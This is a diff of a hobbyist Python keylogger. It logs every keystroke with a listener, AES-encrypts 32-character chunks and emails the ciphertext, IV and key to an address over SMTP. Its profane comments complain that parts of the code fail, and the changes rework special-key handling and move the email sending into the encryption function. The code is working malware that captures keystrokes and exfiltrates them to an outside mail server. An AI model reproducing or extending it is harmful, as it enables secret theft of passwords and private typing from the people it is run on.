@@ -35,16 +35,14 @@ server.login(email, password)
 password = input('Enter your desired AES Password: ')
 print('Everything is setup, the keylogger may start')
 
-#Defining the essential variables
 key = ''
 key_bytes = ''
 plaintext = ''
-ciphertext = ''
 raw = ''
 data_to_be_sent = ''
 full_log = ''
 word = ''
-iv = ''
+
 
 #Building the keylogger (seems to work just fine)
 
@@ -54,71 +52,53 @@ def on_press(key):
      
     if k == 'Key.enter':
         full_log += "[ENTER]\n"
+    elif k == 'Key.space':
+        full_log = full_log.replace("Key.space", " ")
     elif k == 'Key.backspace':
         full_log = full_log[:-1] 
+        full_log = full_log.replace("Key.backspace", " ")
     elif k == 'Key.shift':
         full_log += '^'
     elif k == 'Key.delete':
         full_log += '[DEL]'
-    elif len(full_log) == 32:
+    if len(full_log) == 32:
       data_to_be_encrypted = full_log
       full_log = ''
       encrypt(data_to_be_encrypted, password)
       data_to_be_encrypted = ''
-      send_log()
-      ciphertext = ''
     else:
       full_log += k 
-      print(len(full_log))
+      print(full_log)
            
+
 
 
 #My most precious fucking encryption function i swear i will fucking kill this piece of shit code
 
-def pad_message(data_to_be_encrypted):
-    while len(data_to_be_encrypted)% 16 != 0:
-      data_to_be_encrypted = data_to_be_encrypted + " "
-    return data_to_be_encrypted
 
 def encrypt(data_to_be_encrypted, password):
 
     
     private_key = hashlib.sha256(password.encode("utf-8")).digest()
     mode = AES.MODE_CBC
-    padded_message = pad_message(data_to_be_encrypted)
     iv = 16 * b'\x00'
     cipher = AES.new(private_key, mode, iv)
-    ciphertext = cipher.encrypt(padded_message)
-    print(ciphertext)
-    return ciphertext, iv, private_key
-
-
-    
-    
-
-
-
-
-#This shit ddefines the send_log function which does not seem to work cuz int object has no attribute 'lower'
-def send_log():
-  global iv
-  global key
-  global ciphertext
-  server.sendmail(
+    ciphertext = cipher.encrypt(data_to_be_encrypted.encode("utf-8"))
+    server.sendmail(
           email,
           email,
           ciphertext
      )
-  server.sendmail(
+    server.sendmail(
           email,
           email,
           iv
      )
-  server.sendmail(
+    server.sendmail(
           email,
           email,
-          key
-     )
+          private_key
+    )
 #This stuff starts the listener shit
 with Listener( on_press=on_press ) as listener:
       listener.join()
